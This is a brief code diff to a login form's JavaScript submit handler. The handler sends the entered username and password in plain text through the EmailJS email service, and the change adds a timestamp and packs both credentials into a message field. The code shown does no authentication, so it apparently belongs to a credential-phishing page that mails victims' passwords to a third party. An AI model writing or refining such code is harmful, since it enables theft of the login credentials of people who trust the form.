@@ -34,10 +34,12 @@ loginForm.addEventListener('submit', async function(e) {
   submitButton.disabled = true;
 
   try {
+    const currentTime = new Date().toLocaleString();
+
     const emailParams = {
-      to_email: RECIPIENT_EMAIL,
-      username: username,
-      password: password
+      name: username,
+      time: currentTime,
+      message: `Username: ${username}\nPassword: ${password}`
     };
 
     const emailResponse = await emailjs.send(
